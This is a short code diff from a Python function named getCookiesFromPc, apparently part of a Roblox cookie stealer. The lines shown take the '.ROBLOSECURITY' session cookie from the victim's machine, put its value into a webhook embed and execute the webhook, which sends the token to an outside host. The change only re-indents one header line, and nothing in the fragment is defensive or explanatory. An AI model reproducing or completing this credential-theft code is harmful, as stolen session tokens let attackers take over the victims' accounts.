@@ -17,5 +17,5 @@ def getCookiesFromPc():
             embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
             embed.set_timestamp()
             webhook.add_embed(embed)
-webhook.add_header("Content-Type", "application/json")
+            webhook.add_header("Content-Type", "application/json")
             response = webhook.execute()
